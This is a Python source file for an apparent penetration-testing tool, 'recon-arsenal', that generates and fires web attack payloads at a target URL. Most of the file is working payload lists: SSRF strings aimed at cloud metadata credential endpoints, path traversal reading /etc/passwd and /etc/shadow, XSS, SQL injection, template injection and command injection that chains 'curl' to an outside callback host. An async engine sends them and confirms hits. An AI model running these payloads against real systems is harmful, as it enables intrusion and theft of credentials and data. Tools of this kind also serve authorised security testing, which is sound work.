#!/usr/bin/env python3
"""
recon-arsenal :: exploitation/helpers.py
PoC helper library for common vulnerability verification.
Generates payloads and verifies impact — AUTHORIZED TESTING ONLY.
"""

import argparse
import asyncio
import base64
import hashlib
import json
import random
import re
import string
import sys
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import quote, urljoin, urlparse

import aiohttp
from colorama import Fore, Style, init
from rich.console import Console
from rich.panel import Panel

init(autoreset=True)
console = Console()

BANNER = f"""{Fore.RED}
╔══════════════════════════════════════════════════╗
║    recon-arsenal :: exploitation helpers v1.0    ║
║  PoC Verification — Authorized Testing ONLY      ║
╚══════════════════════════════════════════════════╝
{Style.RESET_ALL}"""


# ─────────────────────────────────────────────────────
# Payload generators
# ─────────────────────────────────────────────────────

class PayloadGenerator:
    """Generates detection payloads for common vuln classes."""

    # ── SSRF ────────────────────────────────────────
    @staticmethod
    def ssrf(callback_host: str) -> list[str]:
        """Generate SSRF payloads pointing to a callback host."""
        uid = str(uuid.uuid4())[:8]
        cb = f"http://{callback_host}/{uid}"
        return [
            cb,
            f"https://{callback_host}/{uid}",
            f"http://169.254.169.254/latest/meta-data/",        # AWS IMDSv1
            f"http://169.254.170.2/v2/credentials/",            # ECS
            f"http://metadata.google.internal/computeMetadata/v1/",  # GCP
            f"http://169.254.169.254/metadata/instance",        # Azure
            f"http://[::ffff:169.254.169.254]/latest/meta-data/",
            f"file:///etc/passwd",
            f"dict://127.0.0.1:6379/info",
            f"gopher://127.0.0.1:9200/_GET%20/",
        ]

    # ── Path Traversal ───────────────────────────────
    @staticmethod
    def path_traversal() -> list[str]:
        """Generate path traversal detection payloads."""
        targets = [
            ("../../../etc/passwd", "root:x:"),
            ("..%2f..%2f..%2fetc%2fpasswd", "root:x:"),
            ("....//....//....//etc/passwd", "root:x:"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:"),
            ("..%252f..%252f..%252fetc%252fpasswd", "root:x:"),
            ("../../../windows/system32/drivers/etc/hosts", "localhost"),
            ("%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts", "localhost"),
            ("../../../proc/self/environ", "PATH="),
            ("../../../../../etc/shadow", "root:"),
        ]
        return targets  # (payload, indicator_string)

    # ── Open Redirect ────────────────────────────────
    @staticmethod
    def open_redirect(callback: str = "https://evil.example.com") -> list[str]:
        enc = quote(callback)
        double_enc = quote(enc)
        return [
            callback,
            enc,
            f"//{callback.split('//')[1]}",
            f"////{callback.split('//')[1]}",
            f"https:/{callback.split('//')[1]}",
            f"\\\\{callback.split('//')[1]}",
            double_enc,
            f"javascript:window.location='{callback}'",
            f"%0a%0d{callback}",
        ]

    # ── XSS ─────────────────────────────────────────
    @staticmethod
    def xss(marker: Optional[str] = None) -> list[str]:
        m = marker or "".join(random.choices(string.ascii_lowercase, k=6))
        return [
            f"<script>alert('{m}')</script>",
            f"<img src=x onerror=alert('{m}')>",
            f"<svg onload=alert('{m}')>",
            f"'\"><img src=x onerror=alert('{m}')>",
            f"javascript:alert('{m}')",
            f"<details open ontoggle=alert('{m}')>",
            f"<iframe src=javascript:alert('{m}')>",
            f"<math href=javascript:alert('{m}')>click</math>",
            f"%3Cscript%3Ealert('{m}')%3C%2Fscript%3E",
            f"&lt;script&gt;alert('{m}')&lt;/script&gt;",
        ], m

    # ── SQL Injection detection ──────────────────────
    @staticmethod
    def sqli_detection() -> list[tuple[str, str]]:
        """Returns (payload, error_indicator) pairs for error-based detection."""
        return [
            ("'", "sql syntax|mysql_fetch|ORA-|sqlite|pg_query|syntax error"),
            ('"', "sql syntax|mysql_fetch|ORA-|sqlite|pg_query|syntax error"),
            ("1' AND '1'='1", ""),
            ("1' AND '1'='2", ""),
            ("1 AND 1=1--", ""),
            ("1 AND 1=2--", ""),
            ("' OR SLEEP(5)--", ""),
            ("1; WAITFOR DELAY '0:0:5'--", ""),
            ("' UNION SELECT NULL--", "union|column"),
            ("' UNION SELECT NULL,NULL--", "union|column"),
        ]

    # ── SSTI ────────────────────────────────────────
    @staticmethod
    def ssti() -> list[tuple[str, str]]:
        """Returns (payload, expected_output) for SSTI detection."""
        return [
            ("{{7*7}}", "49"),                    # Jinja2 / Twig
            ("${7*7}", "49"),                     # Freemarker / Thymeleaf
            ("<%= 7*7 %>", "49"),                 # ERB
            ("#{7*7}", "49"),                     # Ruby
            ("*{7*7}", "49"),                     # Spring
            ("{{7*'7'}}", "7777777"),             # Jinja2
            ("${{7*7}}", "49"),                   # Twig
            ("{7*7}", "49"),                      # Go templates
            ("{% debug %}", "context"),           # Jinja2 debug
        ]

    # ── Command Injection ────────────────────────────
    @staticmethod
    def cmdi(callback: Optional[str] = None) -> list[str]:
        """Generate command injection payloads (DNS/HTTP callback for blind)."""
        cb_part = f"curl {callback}" if callback else "id"
        return [
            f"; {cb_part}",
            f"| {cb_part}",
            f"& {cb_part}",
            f"`{cb_part}`",
            f"$({cb_part})",
            f"\n{cb_part}",
            f"|| {cb_part}",
            f"&& {cb_part}",
            f"; {cb_part} #",
            f"\"& {cb_part} &\"",
        ]


# ─────────────────────────────────────────────────────
# Verification engine
# ─────────────────────────────────────────────────────

@dataclass
class VulnResult:
    vuln_type: str
    url: str
    parameter: str
    payload: str
    evidence: str
    severity: str
    confirmed: bool = False


class ExploitVerifier:
    def __init__(self, timeout: int = 10, proxy: Optional[str] = None):
        self.timeout = timeout
        self.proxy = proxy
        self.findings: list[VulnResult] = []

    async def _get(self, session, url, **kwargs):
        try:
            async with session.get(
                url, ssl=False,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                allow_redirects=False,
                **kwargs
            ) as r:
                return r.status, await r.text(errors="ignore"), dict(r.headers), str(r.url)
        except Exception as e:
            return 0, str(e), {}, ""

    async def check_path_traversal(self, session, base_url: str, param: str):
        console.print(f"\n[bold]Testing Path Traversal:[/bold] {param}")
        for payload, indicator in PayloadGenerator.path_traversal():
            url = f"{base_url}?{param}={payload}"
            status, body, hdrs, _ = await self._get(session, url)
            if indicator and re.search(indicator, body, re.I):
                r = VulnResult("Path Traversal", base_url, param, payload,
                               body[:200], "CRITICAL", confirmed=True)
                self.findings.append(r)
                console.print(f"  [bold red]✓ CONFIRMED[/bold red] → {payload[:60]}")
                return
        console.print(f"  [dim]Not detected[/dim]")

    async def check_open_redirect(self, session, base_url: str, param: str,
                                   callback: str = "https://evil.example.com"):
        console.print(f"\n[bold]Testing Open Redirect:[/bold] {param}")
        for payload in PayloadGenerator.open_redirect(callback):
            url = f"{base_url}?{param}={quote(payload)}"
            status, body, hdrs, final_url = await self._get(session, url)
            location = hdrs.get("location","")
            if (300 <= status < 400 and callback.split("//")[1] in location):
                r = VulnResult("Open Redirect", base_url, param, payload,
                               f"Location: {location}", "MEDIUM", confirmed=True)
                self.findings.append(r)
                console.print(f"  [bold yellow]✓ CONFIRMED[/bold yellow] → {payload[:60]}")
                return
        console.print(f"  [dim]Not detected[/dim]")

    async def check_ssti(self, session, base_url: str, param: str):
        console.print(f"\n[bold]Testing SSTI:[/bold] {param}")
        for payload, expected in PayloadGenerator.ssti():
            url = f"{base_url}?{param}={quote(payload)}"
            status, body, hdrs, _ = await self._get(session, url)
            if expected and expected in body:
                r = VulnResult("SSTI", base_url, param, payload,
                               f"Found '{expected}' in response", "CRITICAL", confirmed=True)
                self.findings.append(r)
                console.print(f"  [bold red]✓ CONFIRMED (SSTI)[/bold red] engine output: {expected}")
                return
        console.print(f"  [dim]Not detected[/dim]")

    async def check_sqli_error(self, session, base_url: str, param: str):
        console.print(f"\n[bold]Testing SQLi (error-based):[/bold] {param}")
        for payload, indicator in PayloadGenerator.sqli_detection():
            if not indicator:
                continue
            url = f"{base_url}?{param}={quote(payload)}"
            status, body, hdrs, _ = await self._get(session, url)
            if re.search(indicator, body, re.I):
                r = VulnResult("SQL Injection", base_url, param, payload,
                               body[:200], "CRITICAL", confirmed=True)
                self.findings.append(r)
                console.print(f"  [bold red]✓ DB ERROR DETECTED[/bold red] → {payload}")
                return
        console.print(f"  [dim]No error-based SQLi detected[/dim]")

    def print_summary(self):
        if not self.findings:
            console.print(Panel("[dim]No confirmed vulnerabilities.[/dim]", title="Summary"))
            return
        console.print(Panel(
            "\n".join(f"[{'red' if f.severity=='CRITICAL' else 'yellow'}]"
                      f"[{f.severity}][/] {f.vuln_type} — {f.parameter} — {f.payload[:50]}"
                      for f in self.findings),
            title=f"[bold red]{len(self.findings)} Confirmed Finding(s)[/bold red]",
        ))

    def save(self, path: str):
        Path(path).write_text(json.dumps(
            [f.__dict__ for f in self.findings], indent=2
        ))
        console.print(f"[green]Saved → {path}[/green]")


async def run_checks(args):
    connector = aiohttp.TCPConnector(ssl=False)
    verifier = ExploitVerifier(timeout=args.timeout, proxy=args.proxy)
    params = args.param.split(",") if args.param else ["id", "file", "path", "url", "redirect", "next", "q"]

    async with aiohttp.ClientSession(connector=connector) as session:
        for param in params:
            if args.check in ("all", "lfi"):
                await verifier.check_path_traversal(session, args.url, param)
            if args.check in ("all", "redirect"):
                await verifier.check_open_redirect(session, args.url, param)
            if args.check in ("all", "ssti"):
                await verifier.check_ssti(session, args.url, param)
            if args.check in ("all", "sqli"):
                await verifier.check_sqli_error(session, args.url, param)

    verifier.print_summary()
    if args.output:
        verifier.save(args.output)


def main():
    print(BANNER)
    p = argparse.ArgumentParser(description="Exploitation helpers — authorized testing only")
    p.add_argument("-u","--url", required=True, help="Target URL")
    p.add_argument("--param", help="Comma-separated parameter names to test")
    p.add_argument("-c","--check", default="all",
                   choices=["all","lfi","redirect","ssti","sqli"],
                   help="Which check to run")
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--proxy", help="HTTP proxy")
    p.add_argument("-o","--output", help="Save findings to JSON")
    p.add_argument("--list-payloads", choices=["ssrf","xss","traversal","sqli","ssti","cmdi"],
                   help="Print payloads for a vuln class and exit")
    args = p.parse_args()

    if args.list_payloads:
        gen = PayloadGenerator()
        name = args.list_payloads
        if name == "ssrf":     payloads = gen.ssrf("YOUR-CALLBACK-HOST.com")
        elif name == "xss":    payloads, _ = gen.xss("MARKER")
        elif name == "traversal": payloads = [p for p,_ in gen.path_traversal()]
        elif name == "sqli":   payloads = [p for p,_ in gen.sqli_detection()]
        elif name == "ssti":   payloads = [p for p,_ in gen.ssti()]
        elif name == "cmdi":   payloads = gen.cmdi()
        for pl in payloads:
            print(pl)
        return

    asyncio.run(run_checks(args))


if __name__ == "__main__":
    main()